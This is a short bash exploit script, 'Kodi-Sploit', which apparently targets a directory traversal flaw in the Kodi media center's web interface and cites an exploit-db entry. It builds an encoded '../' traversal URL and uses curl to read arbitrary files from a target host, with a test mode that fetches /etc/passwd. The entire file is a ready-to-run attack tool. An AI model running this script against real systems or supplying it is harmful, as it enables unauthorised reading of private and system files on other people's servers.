#!/bin/bash
#############################################################
# Kodi-Sploit                                      ##########
# Author DarkerEgo                                 ########
# GPL 2015                                         #####
# https://www.exploit-db.com/exploits/38833/       ###
#####################################################


host=$1
exploit="/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f"




rawurlencode() {
  local string="${1}"
  local strlen=${#string}
  local encoded=""

  for (( pos=0 ; pos<strlen ; pos++ )); do
     c=${string:$pos:1}
     case "$c" in
        [-_.~a-zA-Z0-9] ) o="${c}" ;;
        * )               printf -v o '%%%02x' "'$c"
     esac
     encoded+="${o}"
  done
  echo "${encoded}"    # You can either set a return variable (FASTER) 
  REPLY="${encoded}"   #+or echo the result (EASIER)... or both... :p
}



case "$1" in
 --print|-P) host=$2
exploit="/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f"
lpath=$(rawurlencode "$3")
echo "URL for path $lpath: "
echo $lpath

;;
 -t|--test) echo 'Trying to grab /etc/passwd...'

exploit="/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f"
curl -k $2/$exploit//etc/passwd


;;
 --help|-h)     echo "USAGE: $0 <host> path <1.2.3.4> </etc/passwd>"
		echo '--print|-P : Print URL Only, do not connect'
		echo '--test|-t : Determine if server is vulnerable, try to get /etc/passwd'
		echo  '--help|-h> : Display this help'
		
;;
 *) host=$1
exploit="/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f"
lpath=$(rawurlencode "$2");echo "URL: $lpath"
curl $1/$exploit/$lpath

;;
esac
